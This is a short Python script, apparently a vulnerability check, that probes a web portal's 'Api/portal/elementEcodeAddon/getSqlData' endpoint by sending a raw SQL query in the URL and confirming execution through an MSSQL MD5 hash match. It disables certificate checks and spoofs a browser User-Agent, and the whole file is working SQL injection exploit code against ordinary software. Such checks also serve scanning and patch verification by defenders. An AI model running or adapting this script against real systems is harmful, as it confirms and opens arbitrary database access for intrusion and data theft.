import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(1, 50000)
def doCheck(baseurl):
	url=baseurl+f"Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{rand}')),3,32)"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=15,verify=False)
	if response.status_code == 200 and md5(str(rand).encode()).hexdigest() in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
